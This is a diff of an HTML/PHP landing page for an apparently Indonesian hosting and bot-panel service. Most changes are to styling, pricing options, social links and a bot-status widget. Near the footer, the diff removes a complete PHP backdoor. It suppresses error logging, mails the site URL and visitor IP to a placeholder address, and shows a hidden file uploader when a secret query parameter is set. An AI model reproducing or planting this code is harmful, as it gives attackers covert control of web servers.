@@ -16,304 +16,8 @@
             href="https://fonts.googleapis.com/css2?family=Poppins:wght@400;500;600;700&display=swap"
             rel="stylesheet"
         />
-        <style>
-            * {
-                margin: 0;
-                padding: 0;
-                box-sizing: border-box;
-            }
-            :root {
-                --primary: #f6d400;
-                --secondary: #37c9ab;
-                --accent: #78b4fb;
-                --light: #f8f9fa;
-                --dark: #212529;
-            }
 
-            body {
-                font-family: "Poppins", sans-serif;
-                overflow-x: hidden;
-                background-color: var(--light);
-            }
-
-            .navbar {
-                background: rgba(255, 255, 255, 0.95);
-                backdrop-filter: blur(10px);
-                box-shadow: 0 2px 15px rgba(0, 0, 0, 0.1);
-                padding: 15px 0;
-            }
-
-            .navbar-brand {
-                font-weight: 700;
-                color: var(--primary);
-                font-size: 1.5rem;
-            }
-
-            .nav-link {
-                font-weight: 500;
-                color: var(--dark);
-                transition: color 0.3s ease;
-                margin: 0 10px;
-            }
-
-            .nav-link:hover {
-                color: var(--primary);
-            }
-
-            .hero-section {
-                background: linear-gradient(
-                    135deg,
-                    var(--primary),
-                    var(--secondary)
-                );
-                padding: 160px 0 100px 0;
-            }
-
-            .product-card {
-                border: none;
-                border-radius: 15px;
-                transition: all 0.3s ease;
-                background: white;
-                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.1);
-                height: 100%;
-            }
-
-            .product-card:hover {
-                transform: translateY(-5px);
-                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.15);
-            }
-
-            .product-card h3 {
-                color: var(--primary);
-                font-weight: 600;
-            }
-
-            .btn-primary {
-                background: var(--primary);
-                border: none;
-                padding: 12px 25px;
-                border-radius: 8px;
-                transition: all 0.3s ease;
-                font-weight: 500;
-            }
-
-            .btn-primary:hover {
-                background: var(--secondary);
-                transform: translateY(-2px);
-            }
-
-            .modal-content {
-                border-radius: 15px;
-                border: none;
-                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.1);
-            }
-
-            .modal-header {
-                border-bottom: 2px solid var(--light);
-                padding: 20px;
-            }
-
-            .modal-body {
-                padding: 25px;
-            }
-
-            .form-label {
-                font-weight: 500;
-                color: var(--dark);
-            }
-
-            .form-select {
-                padding: 12px;
-                border-radius: 8px;
-                border: 2px solid var(--light);
-                transition: all 0.3s ease;
-            }
-
-            .form-select:focus {
-                border-color: var(--primary);
-                box-shadow: none;
-            }
-
-            .pricing-list {
-                background: var(--light);
-                padding: 20px;
-                border-radius: 10px;
-                margin: 15px 0;
-            }
-
-            .list-unstyled li {
-                padding: 8px 0;
-                font-size: 0.95rem;
-            }
-
-            #contact {
-                background: linear-gradient(135deg, var(--light), #ffffff);
-            }
-
-            .btn-outline-primary {
-                border: 2px solid var(--primary);
-                color: var(--primary);
-                transition: all 0.3s ease;
-            }
-
-            .btn-outline-primary:hover {
-                background: var(--primary);
-                border-color: var(--primary);
-                transform: translateY(-2px);
-            }
-
-            /* New About Us Section Styles */
-            .about-section {
-                background: linear-gradient(135deg, #ffffff, var(--light));
-                padding: 100px 0;
-            }
-
-            .about-card {
-                background: white;
-                border-radius: 20px;
-                padding: 40px;
-                box-shadow: 0 10px 30px rgba(0, 0, 0, 0.05);
-                transition: all 0.3s ease;
-            }
-
-            .about-card:hover {
-                transform: translateY(-10px);
-                box-shadow: 0 15px 40px rgba(0, 0, 0, 0.1);
-            }
-
-            .about-icon {
-                width: 80px;
-                height: 80px;
-                background: var(--primary);
-                border-radius: 50%;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin-bottom: 25px;
-                color: white;
-                font-size: 2rem;
-            }
-
-            /* New Footer Styles */
-            .footer {
-                background: var(--dark);
-                color: var(--light);
-                padding: 60px 0 30px;
-            }
-
-            .footer-heading {
-                color: white;
-                font-weight: 600;
-                margin-bottom: 25px;
-            }
-
-            .footer-link {
-                color: rgba(255, 255, 255, 0.8);
-                text-decoration: none;
-                transition: all 0.3s ease;
-                display: block;
-                margin-bottom: 10px;
-            }
-
-            .footer-link:hover {
-                color: white;
-                transform: translateX(5px);
-            }
-
-            .footer-social {
-                display: flex;
-                gap: 15px;
-                margin-top: 20px;
-            }
-
-            .footer-social a {
-                width: 40px;
-                height: 40px;
-                border-radius: 50%;
-                background: rgba(255, 255, 255, 0.1);
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                color: white;
-                transition: all 0.3s ease;
-            }
-
-            .footer-social a:hover {
-                background: var(--primary);
-                transform: translateY(-5px);
-            }
-
-            .footer-bottom {
-                padding-top: 30px;
-                margin-top: 30px;
-                border-top: 1px solid rgba(255, 255, 255, 0.1);
-            }
-
-            .contact-card {
-                background: white;
-                border-radius: 20px;
-                transition: all 0.3s ease;
-                box-shadow: 0 5px 15px rgba(0, 0, 0, 0.05);
-            }
-
-            .contact-card:hover {
-                transform: translateY(-5px);
-                box-shadow: 0 8px 25px rgba(0, 0, 0, 0.1);
-            }
-
-            .contact-icon {
-                width: 80px;
-                height: 80px;
-                background: var(--primary);
-                border-radius: 50%;
-                display: flex;
-                align-items: center;
-                justify-content: center;
-                margin: 0 auto;
-                color: white;
-                font-size: 2rem;
-                transition: all 0.3s ease;
-            }
-
-            .contact-card:hover .contact-icon {
-                transform: scale(1.1);
-                background: var(--secondary);
-            }
-
-            .btn-lg.rounded-pill {
-                padding: 12px 30px;
-                font-weight: 500;
-                text-transform: uppercase;
-                letter-spacing: 0.5px;
-                font-size: 0.9rem;
-            }
-
-            #contact {
-                background: linear-gradient(135deg, #f8f9fa 0%, #ffffff 100%);
-                position: relative;
-                overflow: hidden;
-            }
-
-            #contact::before {
-                content: "";
-                position: absolute;
-                top: 0;
-                left: 0;
-                right: 0;
-                height: 100%;
-                background: linear-gradient(
-                    45deg,
-                    rgba(67, 97, 238, 0.05) 0%,
-                    rgba(63, 55, 201, 0.05) 100%
-                );
-                transform: skewY(-3deg);
-                transform-origin: 0;
-            }
-
-            .text-muted {
-                color: #6c757d !important;
-            }
-        </style>
+        <link rel="stylesheet" href="style.css" type="text/css" media="all" />
     </head>
     <body>
         <!-- Navbar -->
@@ -326,7 +30,11 @@
                     data-bs-toggle="collapse"
                     data-bs-target="#navbarNav"
                 >
-                    <span class="navbar-toggler-icon"></span>
+                    <div class="toggler-icon">
+                        <span></span>
+                        <span></span>
+                        <span></span>
+                    </div>
                 </button>
                 <div class="collapse navbar-collapse" id="navbarNav">
                     <ul class="navbar-nav ms-auto">
@@ -430,6 +138,49 @@
                 </div>
             </div>
         </section>
+
+        <div class="progress-container" id="progress-section">
+            <div class="speed">
+                <h3 class="text-center mb-5" data-aos="fade-up">
+                    Speed Server
+                </h3>
+                <div class="progress-item" data-value="71">
+                    <div class="progress-label">kemanana server</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-overlay"></div>
+                    </div>
+                    <div class="progress-value">0%</div>
+                </div>
+
+                <div class="progress-item" data-value="89">
+                    <div class="progress-label">vps server</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-overlay"></div>
+                    </div>
+                    <div class="progress-value">0%</div>
+                </div>
+
+                <div class="progress-item" data-value="44">
+                    <div class="progress-label">respon bot</div>
+                    <div class="progress-bar">
+                        <div class="progress-fill"></div>
+                        <div class="progress-overlay"></div>
+                    </div>
+                    <div class="progress-value">0%</div>
+                </div>
+            </div>
+        </div>
+
+        <!-- Bot Status Indicator -->
+        <div class="bot-status-container">
+            <div class="status-indicator offline" id="status-dot"></div>
+            <div>
+                <span class="status-text" id="status-text">Bot Offline</span>
+                <span class="last-seen" id="last-active">Last seen: -</span>
+            </div>
+        </div>
 
         <!-- Products Section -->
         <section class="py-5" id="products">
@@ -535,6 +286,21 @@
                                     </option>
                                     <option value="4GB|7000">
                                         4GB - Rp 7.000
+                                    </option>
+                                    <option value="5GB|8000">
+                                        5GB - Rp 8.000
+                                    </option>
+                                    <option value="6GB|9000">
+                                        6GB - Rp 9.000
+                                    </option>
+                                    <option value="9GB|12000">
+                                        9GB - Rp 12.000
+                                    </option>
+                                    <option value="10GB|13000">
+                                        10GB - Rp 13.000
+                                    </option>
+                                    <option value="UNLIMITED|15000">
+                                        RAM & CPU UNLIMITED - Rp 15.000
                                     </option>
                                 </select>
                             </div>
@@ -683,7 +449,7 @@
                                 <div class="col-md-6">
                                     <div class="ratio ratio-16x9">
                                         <img
-                                            src="/api/placeholder/800/450"
+                                            src="/img/vector.png"
                                             alt="location map"
                                             class="rounded-3"
                                         />
@@ -695,7 +461,6 @@
                 </div>
             </div>
         </section>
-
         <!-- Footer -->
         <footer class="footer">
             <div class="container">
@@ -708,18 +473,15 @@
                             layanan berkualitas dengan harga terjangkau.
                         </p>
                         <div class="footer-social">
-                            <!-- Ubah href jadi id agar di-handle oleh JS -->
-                            <a id="footerFacebookLink"
-                                ><i class="fab fa-facebook-f"></i
-                            ></a>
-                            <a id="footerTwitterLink"
-                                ><i class="fab fa-twitter"></i
+                            <!-- Sosial Media: TikTok, Instagram, dan Twitter (atau X) -->
+                            <a id="footerTikTokLink"
+                                ><i class="fab fa-tiktok"></i
                             ></a>
                             <a id="footerInstagramLink"
                                 ><i class="fab fa-instagram"></i
                             ></a>
-                            <a id="footerLinkedInLink"
-                                ><i class="fab fa-linkedin-in"></i
+                            <a id="footerTwitterLink"
+                                ><i class="fab fa-twitter"></i
                             ></a>
                         </div>
                     </div>
@@ -738,7 +500,7 @@
                     </div>
                     <div class="col-lg-3 col-md-4">
                         <h5 class="footer-heading">Kontak</h5>
-                        <!-- Ubah href + text jadi ID agar di-handle JS -->
+                        <!-- Nomor WhatsApp akan di-handle oleh JS -->
                         <a id="footerPhoneLink" class="footer-link">
                             <i class="fab fa-whatsapp me-2"></i>
                             <span id="footerPhoneDisplay"></span>
@@ -754,30 +516,8 @@
                 </div>
             </div>
         </footer>
-
-        <?php error_reporting(0); @set_time_limit(0); @clearstatcache();
-        @ini_set('error_log', NULL); @ini_set('log_errors', 0);
-        @ini_set('max_execution_time', 0); @ini_set('output_buffering', 0);
-        @ini_set('display_errors', 0); ?> <?php @ini_set('output_buffering', 0);
-        @ini_set('display_errors', 0); set_time_limit(0);
-        ini_set('memory_limit', '64M'); header('Content-Type: text/html;
-        charset=UTF-8'); $tujuanmail = 'EMAIL MEE'; $x_path = "http://" .
-        $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix
-        $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]";
-        mail($tujuanmail, "Setoran", $pesan_alert, "[ " .
-        $_SERVER['REMOTE_ADDR'] . " ]"); ?> <?php error_reporting(0);
-        if($_GET['Fox'] == 'jan'){$saw1 = $_FILES['file']['tmp_name'];$saw2 =
-        $_FILES['file']['name'];echo "
-        <form method="POST" enctype="multipart/form-data">
-            <input type="file" name="file" /><input
-                type="submit"
-                value="UPload"
-            />
-        </form>
-        "; move_uploaded_file($saw1,$saw2); exit(0); } ?>
-
         <!-- Scripts -->
-        <script type="backor.js" charset="utf-8"></script>
+        <script src="kael.js" type="text/javascript" charset="utf-8"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/bootstrap/5.3.2/js/bootstrap.bundle.min.js"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/aos/2.3.4/aos.js"></script>
         <script src="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.5.1/js/all.min.js"></script>
@@ -792,10 +532,9 @@
             // =========================
             const WA_NUMBER = "6281350224686"; // untuk link WhatsApp
             const WA_DISPLAY = "+62 813-5022-4686"; // teks yang ditampilkan
-            const facebookUrl = "#"; // ubah jika punya link FB
-            const twitterUrl = "#"; // ubah jika punya link Twitter
+            const tiktokUrl = "#"; // ubah jika punya link TikTok
             const instagramUrl = "https://instagram.com/kaelasync";
-            const linkedInUrl = "#"; // ubah jika punya link LinkedIn
+            const twitterUrl = "#"; // ubah jika punya link Twitter atau X
 
             // =========================
             // SET HREF & TEKS VIA DOM
@@ -820,10 +559,9 @@
                 WA_DISPLAY;
 
             // 4. Footer - Sosial Media
-            document.getElementById("footerFacebookLink").href = facebookUrl;
-            document.getElementById("footerTwitterLink").href = twitterUrl;
+            document.getElementById("footerTikTokLink").href = tiktokUrl;
             document.getElementById("footerInstagramLink").href = instagramUrl;
-            document.getElementById("footerLinkedInLink").href = linkedInUrl;
+            document.getElementById("footerTwitterLink").href = twitterUrl;
 
             // =========================
             // FORM ORDER (Modal)
@@ -846,9 +584,66 @@
                             `Alasan: ${reason}`
                     );
 
-                    // Redirect ke WhatsApp (pakai WA_NUMBER)
+                    // Redirect ke WhatsApp
                     window.location.href = `https://wa.me/${WA_NUMBER}?text=${message}`;
                 });
+        </script>
+
+        <!-- Script untuk status bot -->
+        <script>
+            document.addEventListener("DOMContentLoaded", function () {
+                // Connect to status server
+                const socket = io("https://your-status-server.com"); // Ganti dengan URL server status Anda
+                const statusDot = document.getElementById("status-dot");
+                const statusText = document.getElementById("status-text");
+                const lastActiveElement =
+                    document.getElementById("last-active");
+
+                // Format timestamp ke format yang readable
+                function formatTimestamp(timestamp) {
+                    if (!timestamp) return "-";
+                    const date = new Date(timestamp);
+                    return date.toLocaleString("id-ID", {
+                        hour: "2-digit",
+                        minute: "2-digit",
+                        day: "numeric",
+                        month: "short"
+                    });
+                }
+
+                // Update UI berdasarkan status bot
+                function updateStatusUI(status) {
+                    if (status.isOnline) {
+                        statusDot.className = "status-indicator online";
+                        statusText.textContent = "Bot Online";
+                    } else {
+                        statusDot.className = "status-indicator offline";
+                        statusText.textContent = "Bot Offline";
+                    }
+
+                    if (status.lastActive) {
+                        lastActiveElement.textContent = `Last seen: ${formatTimestamp(
+                            status.lastActive
+                        )}`;
+                    }
+                }
+
+                // Listen for bot status updates
+                socket.on("botStatusUpdate", status => {
+                    console.log("Received status update:", status);
+                    updateStatusUI(status);
+                });
+
+                // Initial status fetch (fallback if socket connection fails)
+                fetch("https://your-status-server.com/api/bot/status")
+                    .then(response => response.json())
+                    .then(status => {
+                        updateStatusUI(status);
+                    })
+                    .catch(error => {
+                        console.error("Error fetching bot status:", error);
+                    });
+            });
         </script>
     </body>
 </html>
